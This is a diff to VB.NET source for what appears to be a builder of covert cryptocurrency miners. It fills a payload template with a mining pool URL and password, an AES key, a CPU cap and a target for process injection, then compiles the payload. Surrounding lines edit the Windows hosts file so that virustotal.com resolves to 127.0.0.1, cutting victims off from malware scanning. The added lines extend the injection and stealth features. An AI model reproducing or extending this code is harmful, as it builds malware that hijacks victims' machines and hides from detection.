@@ -21,7 +21,7 @@
         End Try
 
         Try
-            Dim path As String = "C:\Windows\System32\Drivers\Etc\Hosts"
+            Dim path As String = Environment.GetFolderPath(Environment.SpecialFolder.Windows) + "\System32\drivers\etc\hosts"
             If IO.File.Exists(path) AndAlso Not IO.File.ReadAllText(path).Contains("virustotal") Then
 
                 Dim appendText As String = "127.0.0.1    https://www.virustotal.com" + Environment.NewLine + "127.0.0.1    http://www.virustotal.com" + Environment.NewLine + "127.0.0.1    www.virustotal.com" +
@@ -65,6 +65,7 @@
 
         Try
             If txtLog.InvokeRequired Then : txtLog.Invoke(Sub() txtLog.ResetText()) : Else : txtLog.ResetText() : End If
+            Dim InjectionTarget = txtInjection.Text.Split(" ")
             Dim Source = My.Resources.Program
             txtLog.Text = txtLog.Text.Insert(0, "Starting..." + vbNewLine)
             Source = Replace(Source, "#dll", Resources_dll)
@@ -76,6 +77,9 @@
             Source = Replace(Source, "#URL", txtPoolURL.Text)
             Source = Replace(Source, "#PWD", txtPoolPassowrd.Text)
             Source = Replace(Source, "#KEY", AESKEY)
+            Source = Replace(Source, "#MaxCPU", txtMaxCPU.Text.Replace("%", ""))
+            Source = Replace(Source, "#InjectionTarget", InjectionTarget(0))
+            Source = Replace(Source, "#InjectionDir", InjectionTarget(1).Replace("(", "").Replace(")", "").Replace("%WINDIR%", Environment.GetFolderPath(Environment.SpecialFolder.Windows)))
 
 
             txtLog.Text = txtLog.Text.Insert(0, "Adding injection " + txtInjection.Text + vbNewLine)
@@ -104,7 +108,7 @@
 
             End If
 
-            If chkIcon.Checked Then
+            If chkIcon.Checked And txtIconPath.Text IsNot "" Then
                 Codedom.Compiler(OutputPayload, Source, Resources_Parent, txtIconPath.Text)
             Else
                 Codedom.Compiler(OutputPayload, Source, Resources_Parent, Nothing)
